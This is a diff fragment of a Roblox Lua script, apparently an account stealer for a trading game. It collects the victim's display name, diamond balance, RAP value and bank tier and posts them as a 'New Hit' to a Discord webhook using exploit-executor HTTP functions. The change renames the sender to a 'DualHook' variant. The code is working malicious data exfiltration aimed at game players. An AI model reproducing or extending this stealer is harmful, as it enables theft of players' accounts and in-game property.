@@ -40,7 +40,7 @@ _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
 _G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
 _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
-local function sendwebhook(msg)
+local function sendwebhookDualHook(msgpremium)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
 	["content"]= "**💎New Hit With Arkhalis Premium💎** || @here|| ",
@@ -82,4 +82,4 @@ local msg = {
   request = http_request or request or HttpPost or syn.request
   request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
   end
-  sendwebhook(msg)
+sendwebhookDualHook(msgpremium)
